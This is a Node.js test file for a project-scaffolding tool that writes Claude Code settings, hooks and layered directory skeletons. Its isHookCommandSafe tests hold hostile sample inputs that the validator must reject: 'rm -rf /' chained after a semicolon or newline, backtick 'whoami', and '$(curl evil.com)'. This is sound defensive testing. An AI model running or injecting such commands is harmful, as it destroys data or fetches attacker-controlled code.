// bin/__tests__/dev-flow-init.test.js
'use strict';

const { test } = require('node:test');
const assert   = require('node:assert/strict');
const fs       = require('fs');
const os       = require('os');
const path     = require('path');

const {
  applySubstitutions,
  getStackPreset,
  renderSettingsLocal,
  createEmptyScaffoldDirs,
  createProjectSkeleton,
  isHookCommandSafe,
  STACK_PRESETS,
  NOOP_COMMAND,
  TEMPLATE_MAP,
  EMPTY_SCAFFOLD_DIRS,
} = require('../dev-flow-init.js');

// ─── applySubstitutions ───────────────────────────────────────────────────────

test('applySubstitutions: replaces [Project Name]', () => {
  const result = applySubstitutions('# [Project Name] — Context', {
    projectName: 'MyApp', ownerRole: '', date: '', layers: '',
  });
  assert.equal(result, '# MyApp — Context');
});

test('applySubstitutions: replaces CLAUDE.md role token', () => {
  const result = applySubstitutions('owner: [role — not personal name]', {
    projectName: '', ownerRole: 'Tech Lead', date: '', layers: '',
  });
  assert.equal(result, 'owner: Tech Lead');
});

test('applySubstitutions: replaces TODO.md role token', () => {
  const result = applySubstitutions('[role — e.g. "Tech Lead", "Dev Lead"] here', {
    projectName: '', ownerRole: 'Dev Lead', date: '', layers: '',
  });
  assert.equal(result, 'Dev Lead here');
});

test('applySubstitutions: replaces YYYY-MM-DD', () => {
  const result = applySubstitutions('last_updated: YYYY-MM-DD', {
    projectName: '', ownerRole: '', date: '2026-04-25', layers: '',
  });
  assert.equal(result, 'last_updated: 2026-04-25');
});

test('applySubstitutions: replaces multi-line layer block', () => {
  const tmpl = [
    '> **Layer values** [CUSTOMIZE]',
    "> `[list your stack's layer names — see docs/blueprint/09-customization.md for stack-specific examples]`",
    '> Example — Node/Express: `api, service, repository, middleware, model`',
    '> Example — React/Next.js: `api, hook, component, page, store, infrastructure`',
    '> end',
  ].join('\n');

  const result = applySubstitutions(tmpl, {
    projectName: '', ownerRole: '', date: '', layers: 'api, service, repo',
  });

  assert.ok(result.includes('> `api, service, repo`'), 'layer line present');
  assert.ok(!result.includes('Example —'), 'example lines removed');
  assert.ok(result.includes('> end'), 'content after block preserved');
});

test('applySubstitutions: keeps [CUSTOMIZE] tokens untouched', () => {
  const result = applySubstitutions('[CUSTOMIZE] section header', {
    projectName: '', ownerRole: '', date: '', layers: '',
  });
  assert.equal(result, '[CUSTOMIZE] section header');
});

test('applySubstitutions: unknown placeholder passes through', () => {
  const result = applySubstitutions('[Some Unknown Token]', {
    projectName: '', ownerRole: '', date: '', layers: '',
  });
  assert.equal(result, '[Some Unknown Token]');
});

test('applySubstitutions: replaces multiple occurrences', () => {
  const result = applySubstitutions('[Project Name] and [Project Name]', {
    projectName: 'Acme', ownerRole: '', date: '', layers: '',
  });
  assert.equal(result, 'Acme and Acme');
});

// ─── getStackPreset ───────────────────────────────────────────────────────────

test('getStackPreset: node-express has CA+DDD layers (domain, application)', () => {
  const layers = getStackPreset('node-express').layers;
  assert.ok(layers.includes('domain'), 'domain layer present');
  assert.ok(layers.includes('application'), 'application layer present');
  assert.ok(layers.includes('infrastructure'), 'infrastructure layer present');
  assert.ok(layers.includes('interface'), 'interface layer present');
  assert.ok(layers.includes('shared'), 'shared layer present');
});

test('getStackPreset: node-express has npm-style lint command', () => {
  assert.equal(getStackPreset('node-express').lintCommand, 'npm run lint');
});

test('getStackPreset: node-express sourceRoot = src and testRoot = tests', () => {
  const p = getStackPreset('node-express');
  assert.equal(p.sourceRoot, 'src');
  assert.equal(p.testRoot, 'tests');
});

test('getStackPreset: react-next has 4-layer variant (interface collapses to app/)', () => {
  const p = getStackPreset('react-next');
  assert.ok(p.layers.includes('domain'));
  assert.ok(p.layers.includes('application'));
  assert.ok(p.layers.includes('infrastructure'));
  assert.ok(p.layers.includes('shared'));
  assert.ok(!p.layers.includes('interface'), 'no interface layer (collapses to app/)');
  assert.equal(p.appRoot, 'app');
});

test('getStackPreset: python-fastapi uses ruff for lint', () => {
  assert.equal(getStackPreset('python-fastapi').lintCommand, 'ruff check .');
});

test('getStackPreset: python-fastapi uses pip as package manager', () => {
  assert.equal(getStackPreset('python-fastapi').packageManager, 'pip');
});

test('getStackPreset: python-fastapi sourceRoot = app', () => {
  assert.equal(getStackPreset('python-fastapi').sourceRoot, 'app');
});

test('getStackPreset: go-gin uses go vet for lint', () => {
  assert.equal(getStackPreset('go-gin').lintCommand, 'go vet ./...');
});

test('getStackPreset: go-gin uses go build for typecheck', () => {
  assert.equal(getStackPreset('go-gin').typecheckCommand, 'go build ./...');
});

test('getStackPreset: go-gin sourceRoot = internal + cmdRoot = cmd; no testRoot', () => {
  const p = getStackPreset('go-gin');
  assert.equal(p.sourceRoot, 'internal');
  assert.equal(p.cmdRoot, 'cmd');
  assert.equal(p.testRoot, undefined, 'go tests live alongside source per Go convention');
});

test('getStackPreset: every preset has CA+DDD core fields', () => {
  for (const [name, preset] of Object.entries(STACK_PRESETS)) {
    for (const field of ['layers', 'sourceRoot', 'lintCommand', 'typecheckCommand', 'packageManager']) {
      assert.ok(preset[field], `${name}.${field} is set`);
    }
  }
});

test('getStackPreset: custom returns provided values', () => {
  const p = getStackPreset('custom', {
    layers: 'domain, infra',
    lintCommand: 'eslint .',
    typecheckCommand: 'tsc --noEmit',
    packageManager: 'pnpm',
  });
  assert.equal(p.layers, 'domain, infra');
  assert.equal(p.lintCommand, 'eslint .');
  assert.equal(p.typecheckCommand, 'tsc --noEmit');
  assert.equal(p.packageManager, 'pnpm');
});

test('getStackPreset: custom trims whitespace on layers', () => {
  const p = getStackPreset('custom', { layers: '  layers  ' });
  assert.equal(p.layers, 'layers');
});

test('getStackPreset: custom defaults to no-op commands when missing', () => {
  const p = getStackPreset('custom', { layers: 'a' });
  assert.equal(p.lintCommand, NOOP_COMMAND);
  assert.equal(p.typecheckCommand, NOOP_COMMAND);
  assert.equal(p.packageManager, 'npm');
});

test('getStackPreset: unknown preset returns null', () => {
  assert.equal(getStackPreset('unknown-stack'), null);
});

// ─── renderSettingsLocal ──────────────────────────────────────────────────────

function makeTempDir() {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'dfi-test-'));
}

function rmRf(dir) {
  try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* ignore */ }
}

test('renderSettingsLocal: writes settings.local.json with substituted commands', () => {
  const dir = makeTempDir();
  try {
    const preset = getStackPreset('node-express');
    const result = renderSettingsLocal(dir, preset);
    assert.equal(result.skipped, false);
    const written = JSON.parse(fs.readFileSync(path.join(dir, '.claude', 'settings.local.json'), 'utf8'));
    const allCmds = written.hooks.PreToolUse.flatMap(g => g.hooks.map(h => h.command)).join('\n');
    assert.ok(allCmds.includes('npm run lint'), 'lint command substituted');
    assert.ok(allCmds.includes('npx tsc --noEmit'), 'typecheck command substituted');
    assert.ok(!allCmds.includes('[your-'), 'no placeholder remains');
  } finally {
    rmRf(dir);
  }
});

test('renderSettingsLocal: substitutes [package-manager] in permissions allowlist', () => {
  const dir = makeTempDir();
  try {
    const preset = getStackPreset('python-fastapi');
    renderSettingsLocal(dir, preset);
    const written = JSON.parse(fs.readFileSync(path.join(dir, '.claude', 'settings.local.json'), 'utf8'));
    const allowlist = written.permissions.allow.join(' ');
    assert.ok(allowlist.includes('pip'), 'package-manager substituted in allowlist');
    assert.ok(!allowlist.includes('[package-manager]'), 'no placeholder remains');
  } finally {
    rmRf(dir);
  }
});

test('renderSettingsLocal: strips _instructions block from rendered output', () => {
  const dir = makeTempDir();
  try {
    renderSettingsLocal(dir, getStackPreset('node-express'));
    const written = JSON.parse(fs.readFileSync(path.join(dir, '.claude', 'settings.local.json'), 'utf8'));
    assert.equal(written._instructions, undefined);
  } finally {
    rmRf(dir);
  }
});

// ─── isHookCommandSafe ────────────────────────────────────────────────────────

test('isHookCommandSafe: accepts plain lint commands', () => {
  assert.equal(isHookCommandSafe('npm run lint'), true);
  assert.equal(isHookCommandSafe('npx tsc --noEmit'), true);
  assert.equal(isHookCommandSafe('go vet ./...'), true);
});

test('isHookCommandSafe: accepts && and || chaining', () => {
  assert.equal(isHookCommandSafe('npm run lint && npx tsc --noEmit'), true);
  assert.equal(isHookCommandSafe('npm run lint || true'), true);
});

test('isHookCommandSafe: rejects semicolon (command separator)', () => {
  assert.equal(isHookCommandSafe('npm run lint; rm -rf /'), false);
});

test('isHookCommandSafe: rejects newline', () => {
  assert.equal(isHookCommandSafe('npm run lint\nrm -rf /'), false);
});

test('isHookCommandSafe: rejects backtick command substitution', () => {
  assert.equal(isHookCommandSafe('npm run `whoami`'), false);
});

test('isHookCommandSafe: rejects $() command substitution', () => {
  assert.equal(isHookCommandSafe('npm run $(curl evil.com)'), false);
});

test('isHookCommandSafe: rejects empty / non-string', () => {
  assert.equal(isHookCommandSafe(''), false);
  assert.equal(isHookCommandSafe(null), false);
  assert.equal(isHookCommandSafe(undefined), false);
});

test('renderSettingsLocal: preserves existing settings.local.json — writes .new', () => {
  const dir = makeTempDir();
  try {
    fs.mkdirSync(path.join(dir, '.claude'), { recursive: true });
    const existingPath = path.join(dir, '.claude', 'settings.local.json');
    fs.writeFileSync(existingPath, '{"existing":true}');
    const result = renderSettingsLocal(dir, getStackPreset('node-express'));
    assert.equal(result.preserved, existingPath);
    assert.ok(fs.existsSync(existingPath + '.new'), '.new file written');
    const original = JSON.parse(fs.readFileSync(existingPath, 'utf8'));
    assert.equal(original.existing, true, 'existing file untouched');
  } finally {
    rmRf(dir);
  }
});

// ─── Init scaffold full (Sprint 050) ──────────────────────────────────────────

test('TEMPLATE_MAP includes gitignore entry mapping to .gitignore', () => {
  const entry = TEMPLATE_MAP.find((e) => e.dest === '.gitignore');
  assert.ok(entry, 'gitignore entry present in TEMPLATE_MAP');
  assert.equal(entry.src, 'templates/gitignore.template');
});

test('createEmptyScaffoldDirs: creates docs/codemap/ + docs/adr/ with .gitkeep', () => {
  const dir = makeTempDir();
  try {
    createEmptyScaffoldDirs(dir);
    for (const relDir of EMPTY_SCAFFOLD_DIRS) {
      const dirPath  = path.join(dir, relDir);
      const keepPath = path.join(dirPath, '.gitkeep');
      assert.ok(fs.existsSync(dirPath), `${relDir} dir created`);
      assert.ok(fs.existsSync(keepPath), `${relDir}/.gitkeep written`);
    }
  } finally {
    rmRf(dir);
  }
});

test('createEmptyScaffoldDirs: idempotent on re-run', () => {
  const dir = makeTempDir();
  try {
    createEmptyScaffoldDirs(dir);
    // Write user content alongside .gitkeep to verify second run does not clobber
    const userMarker = path.join(dir, 'docs', 'codemap', 'CODEMAP.md');
    fs.writeFileSync(userMarker, 'user content', 'utf8');
    // Second invocation
    createEmptyScaffoldDirs(dir);
    assert.equal(fs.readFileSync(userMarker, 'utf8'), 'user content', 'user content preserved');
    assert.ok(fs.existsSync(path.join(dir, 'docs', 'adr', '.gitkeep')), 'adr/.gitkeep still present');
  } finally {
    rmRf(dir);
  }
});

// ─── Lean architecture skeleton (Sprint 051a / ADR-029) ───────────────────────

test('createProjectSkeleton: creates 5 CA layers under src/ for node-express', () => {
  const dir = makeTempDir();
  try {
    createProjectSkeleton(dir, getStackPreset('node-express'));
    for (const layer of ['domain', 'application', 'infrastructure', 'interface', 'shared']) {
      const layerPath = path.join(dir, 'src', layer);
      const keepPath  = path.join(layerPath, '.gitkeep');
      assert.ok(fs.existsSync(layerPath), `src/${layer}/ created`);
      assert.ok(fs.existsSync(keepPath),  `src/${layer}/.gitkeep written`);
    }
  } finally {
    rmRf(dir);
  }
});

test('createProjectSkeleton: creates app/ + 4 layers under src/ for react-next', () => {
  const dir = makeTempDir();
  try {
    createProjectSkeleton(dir, getStackPreset('react-next'));
    assert.ok(fs.existsSync(path.join(dir, 'app', '.gitkeep')), 'app/.gitkeep written (Next.js routing)');
    for (const layer of ['domain', 'application', 'infrastructure', 'shared']) {
      assert.ok(fs.existsSync(path.join(dir, 'src', layer, '.gitkeep')), `src/${layer}/.gitkeep written`);
    }
    // interface should NOT be a src/ subdir for react-next (collapses to app/)
    assert.ok(!fs.existsSync(path.join(dir, 'src', 'interface')), 'no src/interface/ for react-next');
  } finally {
    rmRf(dir);
  }
});

test('createProjectSkeleton: creates internal/ layers + cmd/ for go-gin (no testRoot)', () => {
  const dir = makeTempDir();
  try {
    createProjectSkeleton(dir, getStackPreset('go-gin'));
    for (const layer of ['domain', 'application', 'infrastructure', 'interface', 'shared']) {
      assert.ok(fs.existsSync(path.join(dir, 'internal', layer, '.gitkeep')), `internal/${layer}/.gitkeep written`);
    }
    assert.ok(fs.existsSync(path.join(dir, 'cmd', '.gitkeep')), 'cmd/.gitkeep written (Go entry root)');
    assert.ok(!fs.existsSync(path.join(dir, 'tests')), 'no top-level tests/ for go-gin');
  } finally {
    rmRf(dir);
  }
});

test('createProjectSkeleton: creates tests/{unit,integration,e2e}/ for non-go stacks', () => {
  const dir = makeTempDir();
  try {
    createProjectSkeleton(dir, getStackPreset('node-express'));
    for (const testDir of ['unit', 'integration', 'e2e']) {
      assert.ok(fs.existsSync(path.join(dir, 'tests', testDir, '.gitkeep')), `tests/${testDir}/.gitkeep written`);
    }
  } finally {
    rmRf(dir);
  }
});

test('createProjectSkeleton: skips custom preset (no sourceRoot)', () => {
  const dir = makeTempDir();
  try {
    const customPreset = getStackPreset('custom', { layers: 'domain, application', lintCommand: 'echo lint', typecheckCommand: 'echo tc', packageManager: 'npm' });
    createProjectSkeleton(dir, customPreset);
    // Nothing should be created — custom preset has no sourceRoot
    assert.ok(!fs.existsSync(path.join(dir, 'src')),       'no src/ for custom');
    assert.ok(!fs.existsSync(path.join(dir, 'app')),       'no app/ for custom');
    assert.ok(!fs.existsSync(path.join(dir, 'internal')),  'no internal/ for custom');
    assert.ok(!fs.existsSync(path.join(dir, 'tests')),     'no tests/ for custom');
  } finally {
    rmRf(dir);
  }
});

test('createProjectSkeleton: idempotent on re-run preserves user content', () => {
  const dir = makeTempDir();
  try {
    createProjectSkeleton(dir, getStackPreset('python-fastapi'));
    // Write user content under app/domain/
    const userFile = path.join(dir, 'app', 'domain', 'order.py');
    fs.writeFileSync(userFile, 'class Order: pass\n', 'utf8');
    // Second invocation
    createProjectSkeleton(dir, getStackPreset('python-fastapi'));
    assert.equal(fs.readFileSync(userFile, 'utf8'), 'class Order: pass\n', 'user content preserved');
    assert.ok(fs.existsSync(path.join(dir, 'app', 'application', '.gitkeep')), 'application/.gitkeep still present');
  } finally {
    rmRf(dir);
  }
});
